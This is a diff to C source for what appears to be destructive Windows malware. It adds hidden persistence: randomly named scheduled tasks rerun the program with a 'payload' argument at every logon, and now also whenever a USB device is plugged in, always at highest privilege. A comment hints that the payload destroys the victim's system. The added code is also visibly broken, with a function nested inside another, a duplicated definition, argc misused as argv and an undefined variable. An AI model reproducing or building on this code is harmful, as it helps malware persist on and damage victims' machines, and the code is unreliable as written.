@@ -3,9 +3,10 @@
 #include <stdio.h>
 #include <time.h>
 #include <stdlib.h>
-#include <winioctl.h>
+#include <winioctl.h> 
 #include <ntdddisk.h>
 #include <stdbool.h>
+#include <dbt.h>
 
 
 // note*
@@ -49,7 +50,8 @@ void gen_rnd() {
     rand_nm[6] = '\0'; // null term
 }
 
-/*void task_sch() {
+
+void task_sch_logon() {
     char exepath[MAX_PATH]; //finding current executable
     char cmd[MAX_PATH + 256]; // buffer for the rest of the code
 
@@ -62,20 +64,31 @@ void gen_rnd() {
         rand_nm, exepath);
     system(cmd);
     
-}*/
-
-void task_sch() {
-    char exepath[MAX_PATH];
-    char cmd[MAX_PATH + 1024];
-
-    if (!GetModuleFileNameA(NULL, exepath, MAX_PATH)) {
-        return;
+}
+void task_sch_usb() {
+ULONGLONG used_space_drive(const wchar_t* drive) {
+    ULARGE_INTEGER free_bytes, total_bytes, total_free;
+    if (GetDiskFreeSpaceExW(drive, &free_bytes, &total_bytes, &total_free)) {
+        return total_bytes.QuadPart - free_bytes.QuadPart; // get used bytes
     }
+    return 0;
+}
 
-    sprintf(cmd, 
-        "schtasks /create /sc onlogon /tn \"%s\" /tr \"%s payload\" /rl highest /f", 
-        rand_nm, exepath);
-    system(cmd);
+    for (int b = 0; b < 26; b++) {
+        if (drive_mask & (1 << b)) {
+            wchar_t drive[4] = {L'A' + b, L':', L'\\', L'\0'};
+            ULONGLONG used = used_space_drive(drive);
+
+        if (used >= threshold) {
+            sprintf(cmd,
+                "schtasks /create /tn \"%s\" /tr \"%s usbcheck\" /sc ONEVENT /ec System /mo \"*[System[Provider[@Name='Kernel-PnP'] and EventID=200]]\" /rl highest /f",
+                rand_nm, exepath);
+
+            }
+        }
+    }
+}
+void task_sch_usb() { 
 
 }
 // so if you win your system isnt destroyed
@@ -225,6 +238,8 @@ int main(int argc, char *argv[]){
     if (argc > 1 && strcmp(argv[1], "payload") == 0) {
         payload();
         return 0;
+    } else if (strcmp(argc[1], "usb_check") == 0) {
+        task_sch_usb();
     }
     admin_check();
     srand(time(NULL));
